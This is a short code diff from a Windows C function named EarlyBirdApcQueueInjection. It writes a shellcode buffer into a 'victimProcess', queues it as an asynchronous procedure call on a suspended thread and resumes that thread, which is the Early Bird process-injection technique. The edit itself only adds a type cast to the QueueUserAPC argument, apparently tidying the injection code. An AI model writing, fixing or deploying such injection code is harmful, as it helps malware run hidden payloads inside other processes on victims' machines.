@@ -17,7 +17,7 @@ VOID EarlyBirdApcQueueInjection()
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
 	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
-	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)NULL);
 	ResumeThread(threadHandle);
 
 }
